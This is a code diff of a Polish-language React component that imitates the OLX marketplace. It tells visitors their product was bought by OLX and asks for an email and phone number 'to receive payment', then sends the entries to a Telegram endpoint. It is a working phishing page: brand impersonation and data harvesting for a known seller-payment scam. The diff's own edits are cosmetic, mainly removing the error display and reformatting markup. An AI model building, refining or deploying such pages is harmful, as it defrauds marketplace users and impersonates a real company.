@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { Check, AlertCircle } from 'lucide-react';
+import { Check } from 'lucide-react';
 import { sendToTelegram } from '../utils/api';
 
 interface FormData {
@@ -15,11 +15,11 @@ export default function OLXForm() {
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [errors, setErrors] = useState<Partial<FormData>>({});
-  const [submitError, setSubmitError] = useState<string | null>(null);
 
   const validateForm = (): boolean => {
     const newErrors: Partial<FormData> = {};
-
+    
+    // Email validation
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!formData.email.trim()) {
       newErrors.email = 'Adres e-mail jest wymagany';
@@ -37,18 +37,18 @@ export default function OLXForm() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setSubmitError(null);
-
-    if (!validateForm()) return;
+    
+    if (!validateForm()) {
+      return;
+    }
 
     setIsLoading(true);
-
+    
     try {
       await sendToTelegram(formData);
       setIsSubmitted(true);
     } catch (error) {
       console.error('Error sending data:', error);
-      setSubmitError('Wystąpił błąd podczas wysyłania. Spróbuj ponownie.');
     } finally {
       setIsLoading(false);
     }
@@ -56,24 +56,33 @@ export default function OLXForm() {
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
-    setFormData(prev => ({ ...prev, [name]: value }));
+    setFormData(prev => ({
+      ...prev,
+      [name]: value
+    }));
+    
+    // Clear error when user starts typing
     if (errors[name as keyof FormData]) {
-      setErrors(prev => ({ ...prev, [name]: undefined }));
+      setErrors(prev => ({
+        ...prev,
+        [name]: undefined
+      }));
     }
-    if (submitError) setSubmitError(null);
   };
 
   if (isSubmitted) {
     return (
       <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
         <div className="w-full max-w-md">
+          {/* OLX Logo */}
           <div className="text-center mb-8">
-            <div className="inline-block bg-[#002F34] text-[#23E5DB] px-4 py-2 rounded-lg font-bold text-xl">
+            <div className="inline-block bg-gradient-to-r from-[#00D4AA] to-[#00B896] text-white px-4 py-2 rounded-lg font-bold text-xl">
               olx
             </div>
           </div>
 
           <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
+            {/* Success Icon */}
             <div className="w-16 h-16 bg-[#23E5DB]/10 rounded-full flex items-center justify-center mx-auto mb-6">
               <Check className="w-8 h-8 text-[#23E5DB]" />
             </div>
@@ -81,9 +90,14 @@ export default function OLXForm() {
             <h2 className="text-2xl font-bold text-gray-800 mb-4">
               E-mail został wysłany!
             </h2>
-
-            <p className="text-gray-600 mb-4">Wysłaliśmy wiadomość na adres:</p>
-            <p className="font-semibold text-gray-800 mb-6">{formData.email}</p>
+            
+            <p className="text-gray-600 mb-4">
+              Wysłaliśmy wiadomość na adres:
+            </p>
+            
+            <p className="font-semibold text-gray-800 mb-6">
+              {formData.email}
+            </p>
 
             <div className="bg-[#23E5DB]/5 rounded-xl p-4 mb-6">
               <div className="flex items-center justify-center mb-3">
@@ -92,6 +106,7 @@ export default function OLXForm() {
                 </div>
                 <span className="ml-2 font-semibold text-gray-800">Co dalej?</span>
               </div>
+              
               <div className="text-left space-y-2 text-sm text-gray-600">
                 <div className="flex items-start">
                   <span className="text-[#23E5DB] font-bold mr-2">1.</span>
@@ -112,14 +127,14 @@ export default function OLXForm() {
               Otrzymasz e-mail w ciągu 5-10 minut
             </div>
 
-            <button
+            <button 
               onClick={() => setIsSubmitted(false)}
               className="w-full bg-[#002F34] hover:bg-[#001F24] text-white font-semibold py-3 px-6 rounded-xl transition-colors duration-200"
             >
               Wyślij ponownie
             </button>
 
-            <button
+            <button 
               onClick={() => setIsSubmitted(false)}
               className="w-full mt-3 bg-transparent text-gray-600 hover:text-gray-800 font-medium py-3 px-6 transition-colors duration-200"
             >
@@ -141,6 +156,7 @@ export default function OLXForm() {
   return (
     <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
       <div className="w-full max-w-md">
+        {/* OLX Logo */}
         <div className="text-center mb-8">
           <div className="inline-block bg-[#002F34] text-[#23E5DB] px-4 py-2 rounded-lg font-bold text-xl">
             olx
@@ -151,13 +167,15 @@ export default function OLXForm() {
           <h1 className="text-2xl font-bold text-gray-800 mb-4 text-center">
             Witamy w OLX!
           </h1>
-
+          
           <p className="text-gray-600 text-center mb-8 leading-relaxed">
-            Twój produkt został zakupiony przez OLX. Prosimy o podanie adresu e-mail
-            i numeru telefonu, aby otrzymać płatność za produkt.
+            Twój produkt został zakupiony przez OLX. Prosimy o 
+            podanie adresu e-mail i numeru telefonu, aby otrzymać 
+            płatność za produkt.
           </p>
 
           <form onSubmit={handleSubmit} className="space-y-6">
+            {/* Email Field */}
             <div>
               <label htmlFor="email" className="block text-sm font-semibold text-gray-700 mb-2">
                 Adres e-mail
@@ -179,6 +197,7 @@ export default function OLXForm() {
               )}
             </div>
 
+            {/* Phone Field */}
             <div>
               <label htmlFor="phone" className="block text-sm font-semibold text-gray-700 mb-2">
                 Numer telefonu
@@ -200,13 +219,6 @@ export default function OLXForm() {
               )}
             </div>
 
-            {submitError && (
-              <div className="flex items-center gap-2 bg-red-50 border border-red-200 rounded-xl px-4 py-3">
-                <AlertCircle className="w-4 h-4 text-red-500 shrink-0" />
-                <p className="text-sm text-red-600">{submitError}</p>
-              </div>
-            )}
-
             <button
               type="submit"
               disabled={isLoading}
@@ -217,16 +229,23 @@ export default function OLXForm() {
 
             <p className="text-xs text-gray-500 text-center leading-relaxed">
               Klikając "Kontynuuj", zgadzasz się z{' '}
-              <a href="#" className="text-[#23E5DB] hover:underline">Warunkami użytkowania</a>{' '}
+              <a href="#" className="text-[#23E5DB] hover:underline">
+                Warunkami użytkowania
+              </a>{' '}
               i{' '}
-              <a href="#" className="text-[#23E5DB] hover:underline">Polityką prywatności</a>.
+              <a href="#" className="text-[#23E5DB] hover:underline">
+                Polityką prywatności
+              </a>
+              .
             </p>
           </form>
         </div>
 
         <p className="text-center text-sm text-gray-500 mt-6">
           Masz już konto?{' '}
-          <a href="#" className="text-[#23E5DB] hover:underline font-medium">Zaloguj się</a>
+          <a href="#" className="text-[#23E5DB] hover:underline font-medium">
+            Zaloguj się
+          </a>
         </p>
       </div>
     </div>
